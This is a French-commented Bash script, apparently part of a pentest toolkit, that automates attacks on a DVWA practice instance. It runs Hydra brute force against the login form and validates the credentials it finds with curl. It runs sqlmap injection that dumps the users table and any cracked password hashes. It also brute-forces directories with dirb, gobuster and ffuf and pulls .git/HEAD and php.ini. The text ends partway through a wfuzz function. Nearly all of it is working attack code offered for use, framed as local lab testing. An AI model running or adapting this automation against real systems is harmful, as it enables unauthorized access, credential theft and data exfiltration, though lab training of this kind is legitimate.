#!/bin/bash

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh

# Base logs
LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# === Utilitaires ===

# Safe IP detection: prefer a private IPv4, fallback to 127.0.0.1
get_host_ip() {
    ip=$(hostname -I 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^([0-9]{1,3}\.){3}[0-9]{1,3}$/) { print $i; exit }}')
    echo "${ip:-127.0.0.1}"
}

# portable urlencode using python3
urlenc() {
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"
    else
        # fallback minimal-safe replacement (not full RFC) for common payloads
        echo -n "$1" | sed -e 's/ /%20/g' -e 's/</%3C/g' -e 's/>/%3E/g' -e 's/\"/%22/g' -e "s/'/%27/g"
    fi
}

# === D√©pendances par attaque ===
declare -A ATTACK_TOOLS=(
    [hydra]="hydra"
    [sqlmap]="sqlmap"
    [dirb]="dirb"
    [gobuster]="gobuster"
    [wfuzz]="wfuzz"
    [curl]="curl"
    [rockyou]="wordlists"
)

install_tool() {
    case "$1" in
        hydra) sudo apt update && sudo apt install -y hydra ;;
        sqlmap) sudo apt update && sudo apt install -y sqlmap ;;
        dirb) sudo apt update && sudo apt install -y dirb ;;
        gobuster) sudo apt update && sudo apt install -y gobuster ;;
        wfuzz) sudo apt update && sudo apt install -y wfuzz ;;
        curl) sudo apt update && sudo apt install -y curl ;;
        wordlists)
            # paquet contenant rockyou selon distro (kali/ubuntu)
            if sudo apt install -y wordlists 2>/dev/null; then
                true
            else
                # fallback: try seeding rockyou from apt on other systems or leave notice
                echo "Installe rockyou manuellement si besoin (/usr/share/wordlists/rockyou.txt)"
            fi
        ;;
        *) echo "install_tool: inconnu: $1" ;;
    esac
}

check_tools() {
    local missing=0
    for tool in "$@"; do
        if [[ "$tool" == "wordlists" ]]; then
            if [[ ! -f /usr/share/wordlists/rockyou.txt && ! -f /usr/share/wordlists/rockyou.txt.gz ]]; then
                echo -e "${YELLOW}‚ö†Ô∏è rockyou introuvable ‚Üí installation...${NC}"
                install_tool wordlists
                missing=$((missing+1))
            else
                echo -e "${GREEN}‚úîÔ∏è rockyou OK${NC}"
            fi
        else
            if ! command -v "$tool" &>/dev/null; then
                echo -e "${YELLOW}‚ö†Ô∏è $tool manquant ‚Üí installation...${NC}"
                install_tool "$tool"
                missing=$((missing+1))
            else
                echo -e "${GREEN}‚úîÔ∏è $tool OK${NC}"
            fi
        fi
    done

    [[ $missing -eq 0 ]] && echo -e "${GREEN}‚úÖ Tous les outils pr√™ts${NC}\n"
}

# === Fonctions Attaques (extraits & am√©lior√©s) ===

exploit_hydra() {
    clear; banner
    echo -e "${MAGENTA}üîê [Hydra Brute Force - Wordlist selectable + validation automatique]${NC}"
    mkdir -p "$LOG_DIR/hydra" "$LOG_DIR/hydra/validated"
    DEFAULT_IP=$(get_host_ip)
    read -p "üåê IP cible (${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (8081): " PORT
    PORT=${PORT:-8081}
    URL_PATH="/login.php"

    echo -e "${YELLOW}üìÇ Choisir la wordlist :${NC}"
    echo " 1) rockyou (/usr/share/wordlists/rockyou.txt)"
    echo " 2) mini (rapide fallback)"
    echo " 3) custom (chemin complet)"
    read -p "üëâ Choix (1/2/3) : " wl_choice

    WORDLIST=""
    TMP_CREATED=""
    case "$wl_choice" in
        1)
            if [[ -f /usr/share/wordlists/rockyou.txt ]]; then
                WORDLIST="/usr/share/wordlists/rockyou.txt"
            elif [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
                TMP_CREATED="$(mktemp /tmp/rockyou.XXXXXX)"
                zcat /usr/share/wordlists/rockyou.txt.gz > "$TMP_CREATED"
                WORDLIST="$TMP_CREATED"
            else
                echo -e "${RED}‚ùå rockyou introuvable.${NC}"
                wl_choice=2
            fi
            ;;
        2)
            TMP_CREATED="$(mktemp /tmp/mini_hydra.XXXXXX)"
            cat > "$TMP_CREATED" <<'EOF'
123456
password
admin
toor
dvwa
EOF
            WORDLIST="$TMP_CREATED"
            ;;
        3)
            read -p "üìÅ Chemin complet du wordlist : " custom_path
            if [[ -f "$custom_path" ]]; then
                WORDLIST="$custom_path"
            else
                echo -e "${RED}‚ùå Fichier introuvable : $custom_path${NC}"
                [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"
                return
            fi
            ;;
        *)
            echo -e "${YELLOW}Choix invalide ‚Äî fallback mini.${NC}"
            TMP_CREATED="$(mktemp /tmp/mini_hydra.XXXXXX)"
            cat > "$TMP_CREATED" <<'EOF'
123456
password
admin
toor
dvwa
EOF
            WORDLIST="$TMP_CREATED"
            ;;
    esac

    read -p "üë• Utilisateurs (csv) [admin,gordonb,1337,pablo,smithy]: " USERS_IN
    USERS_IN=${USERS_IN:-admin,gordonb,1337,pablo,smithy}
    USERS_FILE="$(mktemp /tmp/hydra_users.XXXXXX)"
    echo "$USERS_IN" | tr ',' '\n' > "$USERS_FILE"

    TIMESTAMP="$(date +%F_%H-%M-%S)"
    OUT_LOG="$LOG_DIR/hydra/hydra_${TIMESTAMP}.log"

    echo -e "${YELLOW}üöÄ Lancement Hydra (timeout 300s)...${NC}"
    timeout 300 hydra -L "$USERS_FILE" -P "$WORDLIST" "$IP" -s "$PORT" http-post-form \
        "${URL_PATH}:username=^USER^&password=^PASS^&Login=Login:Login failed" \
        -t 6 -V 2>&1 | tee "$OUT_LOG"

    echo -e "\n${CYAN}üìä Extraction des paires depuis le log...${NC}"
    FOUND_TMP="/tmp/hydra_found_creds_${TIMESTAMP}.txt"
    grep -E "host: .*login: .*password:" "$OUT_LOG" 2>/dev/null \
      | sed -E 's/.*login: *([^ ]+).*password: *([^ ]+).*/\1:\2/' \
      | sort -u > "$FOUND_TMP" || true

    if [[ ! -s "$FOUND_TMP" ]]; then
        echo -e "${YELLOW}‚ö†Ô∏è Aucun credential trouv√© dans le log Hydra (ou format inattendu).${NC}"
        rm -f "$USERS_FILE" "$FOUND_TMP"
        [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"
        echo -e "${GREEN}‚úÖ Scan Hydra termin√©. Logs dans ${OUT_LOG}${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return
    fi

    echo -e "${CYAN}üîÅ Validation automatique des paires...${NC}"
    VALIDATED_CSV="$LOG_DIR/hydra/validated/hydra_validated_${TIMESTAMP}.csv"
    > "$VALIDATED_CSV"

    SUCCESS_REGEX="logout|welcome|index.php|logged in|You are now logged in|DVWA"

    while IFS=: read -r user pass; do
        COOKIE_JAR="$(mktemp /tmp/hydra_cookie.XXXXXX)"
        curl -s -c "$COOKIE_JAR" "http://${IP}:${PORT}/login.php" -o /dev/null

        curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -L \
            -d "username=${user}&password=${pass}&Login=Login" \
            "http://${IP}:${PORT}/login.php" -o /tmp/_hydra_res.html

        if grep -qiE "${SUCCESS_REGEX}" /tmp/_hydra_res.html; then
            echo "${user},${pass},VALID" >> "$VALIDATED_CSV"
            echo -e "${GREEN}‚úî VALID: ${user}:${pass}${NC}"
        else
            echo "${user},${pass},INVALID" >> "$VALIDATED_CSV"
            echo -e "${RED}‚úñ INVALID: ${user}:${pass}${NC}"
        fi
        rm -f "$COOKIE_JAR" /tmp/_hydra_res.html
    done < "$FOUND_TMP"

    # Nettoyage et suppression des doublons
    sort -u -o "$VALIDATED_CSV" "$VALIDATED_CSV"

    echo -e "\n${CYAN}üìÑ R√©sum√© validation:${NC}"
    column -t -s, "$VALIDATED_CSV"
    VALID_COUNT=$(grep -c ",VALID" "$VALIDATED_CSV" || echo 0)
    INVALID_COUNT=$(grep -c ",INVALID" "$VALIDATED_CSV" || echo 0)
    echo -e "\n${GREEN}‚úÖ Valid√©s: ${VALID_COUNT}${NC} | ${RED}Invalid√©s: ${INVALID_COUNT}${NC}"
    echo -e "${GREEN}R√©sultats valid√©s enregistr√©s dans: ${VALIDATED_CSV}${NC}"

    rm -f "$USERS_FILE" "$FOUND_TMP"
    [[ -n "$TMP_CREATED" ]] && rm -f "$TMP_CREATED"

    echo -e "\n${GREEN}‚úÖ Scan Hydra termin√©. Log Hydra: ${OUT_LOG}${NC}"
    read -p "üëâ Entr√©e pour revenir..."
}

###################################################################################################

exploit_sqlmap() {
    clear; banner
    echo -e "${MAGENTA}üß™ [SQL Injection - sqlmap]${NC}"
    echo "üìñ Objectif : tester simplement si sqlmap fonctionne avec DVWA"
    echo "‚ö†Ô∏è Risque : fuite de donn√©es (test local uniquement)"
    echo "üõ°Ô∏è Mitigation : requ√™tes pr√©par√©es, WAF, moindre privil√®ge DB"
    echo

    # Default LOG_DIR fallback
    : "${LOG_DIR:=${HOME}/ghost00ls/logs/dvwa_exploits}"
    mkdir -p "$LOG_DIR/sqlmap/validated"

    # --- Cible (IP / Port / Path / Query) ---
    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "üåê IP cible (${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (8081): " PORT
    PORT=${PORT:-8081}
    read -p "üìÅ Path vuln (default: /vulnerabilities/sqli/): " PATH_VULN
    PATH_VULN=${PATH_VULN:-/vulnerabilities/sqli/}
    read -p "üßæ Query string (default: ?id=1&Submit=Submit): " QUERY
    QUERY=${QUERY:-"?id=1&Submit=Submit"}

    TARGET="http://$IP:$PORT${PATH_VULN}${QUERY}"
    printf "\n"

    # --- DVWA creds (defaults) ---
    read -p "üë§ Utilisateur DVWA (default: admin): " DVWA_USER
    DVWA_USER=${DVWA_USER:-admin}
    read -p "üîë Mot de passe DVWA (default: password): " DVWA_PASS
    DVWA_PASS=${DVWA_PASS:-password}

    # --- sqlmap detection ---
    SQLMAP_PY="${HOME}/tools/sqlmap/sqlmap.py"
    if [ -f "$SQLMAP_PY" ]; then
        SQLMAP_CMD="python3 \"$SQLMAP_PY\""
    else
        if command -v sqlmap >/dev/null 2>&1; then
            SQLMAP_CMD="sqlmap"
        else
            echo -e "${RED}‚ùå sqlmap introuvable. Installe ~/tools/sqlmap ou ajoute sqlmap au PATH.${NC}"
            read -p "üëâ Entr√©e pour revenir..."
            return 1
        fi
    fi

    echo -e "\nüåê Target : ${TARGET}\n"

    # --- login to DVWA to get cookie ---
    echo -e "${YELLOW}üîë Connexion √† DVWA...${NC}"
    COOKIE_TMP="/tmp/sqlmap_cookie_${USER}"
    rm -f "$COOKIE_TMP"
    RAW_LOGIN_PAGE=$(curl -s -c "$COOKIE_TMP" -L "http://$IP:$PORT/login.php")
    USER_TOKEN=$(echo "$RAW_LOGIN_PAGE" | grep -Po "name=['\"]user_token['\"].*?value=['\"]\K[^'\"]+" || true)

    if [ -n "$USER_TOKEN" ]; then
        curl -s -b "$COOKIE_TMP" -c "$COOKIE_TMP" -L \
            -d "username=${DVWA_USER}&password=${DVWA_PASS}&Login=Login&user_token=${USER_TOKEN}" \
            "http://$IP:$PORT/login.php" >/dev/null
    else
        # try without token
        curl -s -b "$COOKIE_TMP" -c "$COOKIE_TMP" -L \
            -d "username=${DVWA_USER}&password=${DVWA_PASS}&Login=Login" \
            "http://$IP:$PORT/login.php" >/dev/null
    fi

    COOKIE_VALUE=$(awk '/PHPSESSID/ {print $7; exit}' "$COOKIE_TMP" 2>/dev/null || true)
    if [ -z "$COOKIE_VALUE" ]; then
        echo -e "${RED}‚ùå Echec r√©cup√©ration PHPSESSID. V√©rifie l'URL/DVWA/login/credentials.${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi
    COOKIE="PHPSESSID=${COOKIE_VALUE}; security=low"
    echo -e "‚úî Session ouverte (PHPSESSID=${COOKIE_VALUE})"
    echo

    # --- prepare output dir & logs ---
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    OUT_DIR="$LOG_DIR/sqlmap/validated/$TIMESTAMP"
    mkdir -p "$OUT_DIR"
    LOG_DBS="$OUT_DIR/sqlmap_dbs.log"
    LOG_TABLES="$OUT_DIR/sqlmap_tables.log"
    LOG_USERS="$OUT_DIR/sqlmap_users.log"
    LOG_RAW="$OUT_DIR/sqlmap_raw.log"

    SQLMAP_OPTS="--cookie=\"$COOKIE\" --batch --level=2 --risk=1 --random-agent --tamper=space2comment --output-dir=\"$OUT_DIR\""

    echo -e "${YELLOW}‚ñ∂ Test sqlmap --dbs...${NC}"
    eval $SQLMAP_CMD "\"$TARGET\"" $SQLMAP_OPTS --dbs 2>&1 | tee "$LOG_DBS" "$LOG_RAW"

    echo -e "\n${YELLOW}‚ñ∂ Extraction des tables (dvwa)...${NC}"
    eval $SQLMAP_CMD "\"$TARGET\"" $SQLMAP_OPTS -D dvwa --tables 2>&1 | tee -a "$LOG_TABLES" "$LOG_RAW"

    echo -e "\n${YELLOW}‚ñ∂ Dump dvwa.users (si pr√©sente)...${NC}"
    eval $SQLMAP_CMD "\"$TARGET\"" $SQLMAP_OPTS -D dvwa -T users --dump 2>&1 | tee -a "$LOG_USERS" "$LOG_RAW"

    # --- R√©sum√© ---
    echo -e "\n${CYAN}üìä R√©sum√© des r√©sultats sqlmap :${NC}\n"
    echo -e "‚Ä¢ Dossiers de sortie : ${OUT_DIR}\n"

    echo -e "‚Ä¢ Bases d√©tect√©es :"
    if grep -q -E "dvwa|information_schema" "$LOG_DBS" 2>/dev/null; then
        grep -E "dvwa|information_schema" "$LOG_DBS" | sed -n '1,200p'
    else
        if grep -q "available databases" "$LOG_DBS" 2>/dev/null; then
            sed -n '/available databases/,$p' "$LOG_DBS" | sed -n '1,20p'
        else
            echo -e "${RED}  ‚ùå Aucune base trouv√©e${NC}"
        fi
    fi
    echo

    echo -e "‚Ä¢ Tables de dvwa :"
    if [ -f "$LOG_TABLES" ] && grep -q -E "Table|users|guestbook" "$LOG_TABLES" 2>/dev/null; then
        grep -E "Table:|users|guestbook" "$LOG_TABLES" | sed -n '1,200p'
    else
        # fallback search in raw log
        if grep -q -E "users|guestbook" "$LOG_RAW" 2>/dev/null; then
            grep -E "users|guestbook" "$LOG_RAW" | sed -n '1,200p'
        else
            echo -e "${RED}  ‚ùå Aucune table trouv√©e${NC}"
        fi
    fi
    echo

    # --- Post-processing: show dumped users CSV if present ---
    USERS_CSV_PATH=""
    # sqlmap usually dumps to /<OUT_DIR>/<target>/dump/dvwa/users.csv
    POSSIBLE_CSV=$(find "$OUT_DIR" -type f -path "*/dump/dvwa/users.csv" -print -quit 2>/dev/null || true)
    if [ -n "$POSSIBLE_CSV" ]; then
        USERS_CSV_PATH="$POSSIBLE_CSV"
        echo -e "‚Ä¢ Contenu extrait (dvwa.users) :"
        # show pretty table (simple)
        column -t -s, "$USERS_CSV_PATH" 2>/dev/null | sed -n '1,200p' || cat "$USERS_CSV_PATH" | sed -n '1,200p'
        echo
    else
        # try to extract from sqlmap logs
        if grep -q "Table: users" "$LOG_USERS" 2>/dev/null || grep -q "table 'dvwa.users' dumped" "$LOG_RAW" 2>/dev/null; then
            echo -e "‚Ä¢ Contenu extrait (dvwa.users) (log):"
            sed -n '/Table: users/,/^\s*$/p' "$LOG_USERS" 2>/dev/null | sed -n '1,200p'
            echo
        else
            echo -e "${RED}  ‚ùå Aucun dump users trouv√©${NC}\n"
        fi
    fi

    # --- Show cracked passwords if sqlmap attempted cracking ---
    echo -e "‚Ä¢ R√©sultat tentative de craquage de mots de passe (sqlmap) :"
    if grep -q "cracked password" "$LOG_RAW" 2>/dev/null; then
        grep --color=never -E "cracked password '.*' for hash '([0-9a-fA-F]{32}|[0-9a-fA-F]{40}|[0-9a-fA-F]{64})'" "$LOG_RAW" | sed -E "s/cracked password '([^']+)' for hash '([0-9a-fA-F]+)'/  ‚Ä¢ \1 => \2/"
    else
        echo -e "  ‚ö†Ô∏è Aucune entr√©e de craquage automatique trouv√©e dans les logs."
    fi
    echo

    # --- Save validated summary CSV ---
    VALID_CSV="$OUT_DIR/sqlmap_validated_${TIMESTAMP}.csv"
    {
        echo "target,dbs_found,tables_found,users_dumped,users_csv,log_dir"
        DBS_COUNT=$(grep -c -E "dvwa|information_schema" "$LOG_DBS" 2>/dev/null || echo 0)
        TABLES_COUNT=$(grep -c -E "users|guestbook" "$LOG_TABLES" 2>/dev/null || echo 0)
        USERS_DUMPED=$( [ -n "$USERS_CSV_PATH" ] && echo 1 || grep -c "Table: users" "$LOG_USERS" 2>/dev/null || echo 0 )
        echo "\"$TARGET\",\"$DBS_COUNT\",\"$TABLES_COUNT\",\"$USERS_DUMPED\",\"$USERS_CSV_PATH\",\"$OUT_DIR\""
    } > "$VALID_CSV"

    echo -e "${GREEN}‚úÖ Exploitation sqlmap termin√©e.${NC}"
    echo -e "üîé Logs complets dans : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $VALID_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}



###################################################################################################

exploit_dirb() {
    clear; banner

    echo -e "${MAGENTA}üß™ [Directory Bruteforce - dirb/gobuster/ffuf]${NC}"
    echo "üìñ Objectif : d√©couvrir des r√©pertoires/fichiers cach√©s sur la cible"
    echo "‚ö†Ô∏è Risque : bruit r√©seau important, d√©tection IDS/IPS possible (test local uniquement)"
    echo "üõ°Ô∏è Mitigation : limiter l‚Äôexposition, WAF, config serveur stricte"
    echo

    # defaults
    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "üåê IP cible (${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (8081): " PORT
    PORT=${PORT:-8081}
    read -p "üìÅ Path de d√©part (default: /): " START_PATH
    START_PATH=${START_PATH:-/}
    read -p "üìÇ Wordlist (default: /usr/share/wordlists/dirb/common.txt): " WORDLIST
    WORDLIST=${WORDLIST:-/usr/share/wordlists/dirb/common.txt}

    TARGET="http://$IP:$PORT${START_PATH}"
    printf "\nüåê Target : %s\nüìÇ Wordlist : %s\n\n" "$TARGET" "$WORDLIST"

    # log dir
    : "${LOG_DIR:=${HOME}/ghost00ls/logs/dvwa_exploits}"
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    OUT_DIR="$LOG_DIR/dirb/$TIMESTAMP"
    mkdir -p "$OUT_DIR"

    DIRB_LOG="$OUT_DIR/dirb_raw.txt"
    GOBUSTER_LOG="$OUT_DIR/gobuster_raw.txt"
    FFUF_LOG="$OUT_DIR/ffuf_raw.txt"
    COMBINED="$OUT_DIR/combined_paths.txt"

    # check tools
    HAS_DIRB=0
    HAS_GOBUSTER=0
    HAS_FFUF=0

    if command -v dirb >/dev/null 2>&1; then HAS_DIRB=1; fi
    if command -v gobuster >/dev/null 2>&1; then HAS_GOBUSTER=1; fi
    if command -v ffuf >/dev/null 2>&1; then HAS_FFUF=1; fi

    if [ $HAS_DIRB -eq 0 ]; then
        echo -e "${RED}‚ùå dirb introuvable. Installe dirb ou adapte la fonction.${NC}"
        read -p "üëâ Entr√©e pour revenir..."
        return 1
    fi

    # ask options
    read -p "‚ñ∂ Voulez-vous que dirb fasse un scan r√©cursif (aggressif)? [y/N]: " DIRB_RECUR
    DIRB_RECUR=${DIRB_RECUR:-N}
    if [ "$DIRB_RECUR" = "y" ] || [ "$DIRB_RECUR" = "Y" ]; then
        DIRB_OPT="-r"
    else
        DIRB_OPT=""
    fi

    # Offer gobuster / ffuf if available
    RUN_GOBUSTER="n"
    RUN_FFUF="n"
    if [ $HAS_GOBUSTER -eq 1 ]; then
        read -p "‚ñ∂ gobuster trouv√©. Voulez-vous lancer gobuster aussi ? [y/N]: " tmp
        tmp=${tmp:-N}
        if [ "$tmp" = "y" ] || [ "$tmp" = "Y" ]; then RUN_GOBUSTER="y"; fi
    fi
    if [ $HAS_FFUF -eq 1 ]; then
        read -p "‚ñ∂ ffuf trouv√©. Voulez-vous lancer ffuf (rapide/multi-thread) ? [y/N]: " tmp2
        tmp2=${tmp2:-N}
        if [ "$tmp2" = "y" ] || [ "$tmp2" = "Y" ]; then RUN_FFUF="y"; fi
    fi

    echo -e "${YELLOW}‚ñ∂ Scan avec dirb...${NC}"
    # dirb output file parameter differs by install; use -o
    # make output file; run non-interactive
    dirb "$TARGET" "$WORDLIST" $DIRB_OPT -o "$DIRB_LOG" >/dev/null 2>&1 || true
    # ensure file exists
    touch "$DIRB_LOG"

    # gobuster
    if [ "$RUN_GOBUSTER" = "y" ]; then
        echo -e "\n${YELLOW}‚ñ∂ Scan avec gobuster (multithread)...${NC}"
        # -q quiet, but we want output file, follow redirects (-r) and 40 threads
        gobuster dir -u "$TARGET" -w "$WORDLIST" -t 40 -r -o "$GOBUSTER_LOG" >/dev/null 2>&1 || true
        touch "$GOBUSTER_LOG"
    fi

    # ffuf
    if [ "$RUN_FFUF" = "y" ]; then
        echo -e "\n${YELLOW}‚ñ∂ Scan avec ffuf (rapide)...${NC}"
        # Use ffuf with follow redirects disabled (safer) and write raw
        ffuf -u "${TARGET}FUZZ" -w "$WORDLIST" -t 40 -mc all -o "$FFUF_LOG" -of md >/dev/null 2>&1 || true
        touch "$FFUF_LOG"
    fi

    # combine findings into a single file (unique)
    : > "$COMBINED"
    # dirb: extract lines starting with + or ==>
    if [ -s "$DIRB_LOG" ]; then
        grep -E "^\+ |^==>" "$DIRB_LOG" | sed 's/^[+ ]*//' >> "$COMBINED" 2>/dev/null || true
    fi
    # gobuster: lines like /path (Status: ...)
    if [ -s "$GOBUSTER_LOG" ]; then
        grep -E "^/" "$GOBUSTER_LOG" | sed -E 's/^[[:space:]]*//' >> "$COMBINED" 2>/dev/null || true
    fi
    # ffuf: parse its md output for first column (if used)
    if [ -s "$FFUF_LOG" ]; then
        # FFUF md rows contain path names at line start; extract common patterns
        grep -E "^/|^\." "$FFUF_LOG" | sed -E 's/^[[:space:]]*//' >> "$COMBINED" 2>/dev/null || true
    fi
    # canonicalize and unique
    sort -u "$COMBINED" -o "$COMBINED" 2>/dev/null || true

    # Attempt quick downloads of interesting items (robots, phpinfo, .git/HEAD, favicon, php.ini)
    if grep -q -E "/robots.txt|robots.txt" "$COMBINED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ Extraction robots.txt / sauvegarde${NC}"
        curl -sSL --max-time 10 "$TARGET/robots.txt" -o "$OUT_DIR/robots.txt" || true
    fi
    if grep -q -E "phpinfo.php|phpinfo" "$COMBINED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ Tentative sauvegarde phpinfo.php${NC}"
        curl -sSL --max-time 10 "$TARGET/phpinfo.php" -o "$OUT_DIR/phpinfo.html" || true
    fi
    if grep -q -E ".git/HEAD|/\.git/HEAD" "$COMBINED" 2>/dev/null; then
        echo -e "${YELLOW}‚ñ∂ .git/HEAD trouv√© ‚Äî tentative de r√©cup√©ration HEAD${NC}"
        curl -sSL --max-time 10 "$TARGET/.git/HEAD" -o "$OUT_DIR/git_HEAD" || true
    fi
    if grep -q -E "favicon.ico" "$COMBINED" 2>/dev/null; then
        curl -sSL --max-time 10 "$TARGET/favicon.ico" -o "$OUT_DIR/favicon.ico" || true
    fi
    if grep -q -E "php.ini" "$COMBINED" 2>/dev/null; then
        curl -sSL --max-time 10 "$TARGET/php.ini" -o "$OUT_DIR/php.ini" || true
    fi

    # Save a clean "paths" summary (human readable)
    PATHS_SUMMARY="$OUT_DIR/paths_summary.txt"
    {
        echo "=== Combined discovered paths ($(date)) ==="
        echo
        if [ -s "$COMBINED" ]; then
            sed -n '1,500p' "$COMBINED"
        else
            echo "  (aucun r√©sultat trouv√©)"
        fi
    } > "$PATHS_SUMMARY"

    # Create CSV summary
    SUMMARY_CSV="$OUT_DIR/dirb_summary_${TIMESTAMP}.csv"
    DB_DIRB_FOUND=$(grep -c -E "^\+ |^==>|/\.git/HEAD|robots.txt|phpinfo|favicon.ico|php.ini" "$DIRB_LOG" 2>/dev/null || echo 0)
    GB_FOUND=0
    FF_FOUND=0
    if [ -s "$GOBUSTER_LOG" ]; then GB_FOUND=$(grep -c "^/" "$GOBUSTER_LOG" 2>/dev/null || echo 0); fi
    if [ -s "$FFUF_LOG" ]; then FF_FOUND=$(grep -c "^\." "$FFUF_LOG" 2>/dev/null || echo 0); fi
    TOTAL_COMBINED=$(wc -l < "$COMBINED" 2>/dev/null || echo 0)

    {
        echo "timestamp,target,dirb_found,gobuster_found,ffuf_found,combined_count,log_dir"
        echo "\"$TIMESTAMP\",\"$TARGET\",\"$DB_DIRB_FOUND\",\"$GB_FOUND\",\"$FF_FOUND\",\"$TOTAL_COMBINED\",\"$OUT_DIR\""
    } > "$SUMMARY_CSV"

    # --- Pretty terminal summary (verbeux) ---
    echo
    echo -e "${CYAN}üìä R√©sum√© des r√©sultats dirb/gobuster/ffuf :${NC}"
    echo
    echo -e "‚Ä¢ Dossier de sortie : ${OUT_DIR}"
    echo
    echo -e "‚Ä¢ R√©sultats dirb (extraits) :"
    if [ -s "$DIRB_LOG" ]; then
        grep -E "^\+ |^==>" "$DIRB_LOG" | sed 's/^[+ ]*//' | sed -n '1,200p' || echo "  (vide)"
    else
        echo "  ‚ùå Pas de log dirb"
    fi
    echo

    if [ "$RUN_GOBUSTER" = "y" ]; then
        echo -e "‚Ä¢ R√©sultats gobuster (extraits) :"
        if [ -s "$GOBUSTER_LOG" ]; then
            grep -E "^/" "$GOBUSTER_LOG" | sed -n '1,200p' || echo "  (vide)"
        else
            echo "  ‚ùå Pas de log gobuster"
        fi
        echo
    fi

    if [ "$RUN_FFUF" = "y" ]; then
        echo -e "‚Ä¢ R√©sultats ffuf (extraits) :"
        if [ -s "$FFUF_LOG" ]; then
            sed -n '1,200p' "$FFUF_LOG" || echo "  (vide)"
        else
            echo "  ‚ùå Pas de log ffuf"
        fi
        echo
    fi

    echo -e "‚Ä¢ Chemins combin√©s (extraits) :"
    if [ -s "$COMBINED" ]; then
        sed -n '1,200p' "$COMBINED"
    else
        echo "  (aucun chemin combin√© trouv√©)"
    fi
    echo

    # show saved special files
    echo -e "‚ñ∂ Fichiers r√©cup√©r√©s (si pr√©sents) :"
    [ -f "$OUT_DIR/robots.txt" ] && echo "  ‚Ä¢ robots.txt -> $OUT_DIR/robots.txt"
    [ -f "$OUT_DIR/phpinfo.html" ] && echo "  ‚Ä¢ phpinfo -> $OUT_DIR/phpinfo.html"
    [ -f "$OUT_DIR/git_HEAD" ] && echo "  ‚Ä¢ .git/HEAD -> $OUT_DIR/git_HEAD"
    [ -f "$OUT_DIR/favicon.ico" ] && echo "  ‚Ä¢ favicon.ico -> $OUT_DIR/favicon.ico"
    [ -f "$OUT_DIR/php.ini" ] && echo "  ‚Ä¢ php.ini -> $OUT_DIR/php.ini"
    echo

    echo -e "${GREEN}‚úÖ Bruteforce termin√©.${NC}"
    echo -e "üîé Logs complets dans : $OUT_DIR"
    echo -e "‚úÖ R√©sum√© sauvegard√© : $SUMMARY_CSV"
    read -p "üëâ Entr√©e pour revenir..."
}


###################################################################################################

exploit_wfuzz() {
    clear; banner
    
    echo -e "${MAGENTA}üß™ [Fuzzing - wfuzz / ffuf]${NC}"
    echo "üìñ Objectif : trouver endpoints / fichiers via fuzzing"
    echo "‚ö†Ô∏è Risque : forte volum√©trie de requ√™tes, d√©tection IDS/IPS possible (test local uniquement)"
    echo "üõ°Ô∏è Mitigation : limiter threads/wordlist, effectuer en environnement contr√¥l√©"
    echo

    DEFAULT_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "üåê IP cible (default: ${DEFAULT_IP}): " IP
    IP=${IP:-$DEFAULT_IP}
    read -p "üîå Port (default: 8081): " PORT
    PORT=${PORT:-8081}
    read -p "üìÅ Path de d√©part (default: /): " START_PATH
    START_PATH=${START_PATH:-/}
    read -p "üìÇ Wordlist (default: /usr/share/wordlists/dirb/common.txt): " WORDLIST
    WORDLIST=${WORDLIST:-/usr/share/wordlists/dirb/common.txt}
    read -p "‚öôÔ∏è Threads (default: 20): " THREADS
    THREADS=${THREADS:-20}
    read -p "üîé Ignorer status HTTP (comma-separated, ex: 404,403) [default: 404]: " HC_LIST
    HC_LIST=${HC_LIST:-404}

    # default: live streaming ON
    read -p "‚ñ∂ wfuzz trouv√©. Voulez-vous lancer wfuzz ? [Y/n]: " WANT_WFUZZ
    WANT_WFUZZ=${WANT_WFUZZ:-Y}
    read -p "‚ñ∂ ffuf trouv√©. Voulez-vous lancer ffuf (fallback/manual) ? [y/N]: " WANT_FFUF
    WANT_FFUF=${WANT_FFUF:-N}
    read -p "‚ñ∂ Mode verbeux streaming (afficher hits en direct) ? [Y/n]: " STREAMING
    STREAMING=${STREAMING:-Y}
    read -p "‚ûï Ajouter r√©sultats au combined_paths (si pr√©sent) ? [y/N]: " ADD_TO_COMBINED
    ADD_TO_COMBINED=${ADD_TO_COMBINED:-N}

    TARGET="http://$IP:$PORT${START_PATH}"
    printf "\nüåê Target : %s\nüìÇ Wordlist : %s\n\n" "$TARGET" "$WORDLIST"

    # log dir
    : "${LOG_DIR:=${HOME}/ghost00ls/logs/dvwa_exploits}"
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    OUT_DIR="$LOG_DIR/wfuzz/$TIMESTAMP"
    mkdir -p "$OUT_DIR"

    WFUZZ_RAW_CSV="$OUT_DIR/wfuzz_raw.csv"
    WFUZZ_RAW_TXT="$OUT_DIR/wfuzz_raw.txt"
    FFUF_RAW_CSV="$OUT_DIR/ffuf_raw.csv"
    FFUF_RAW_MD="$OUT_DIR/ffuf_raw.md"
    CLEAN="$OUT_DIR/wfuzz_clean.txt"
    PATHS_CSV="$OUT_DIR/wfuzz_paths.csv"
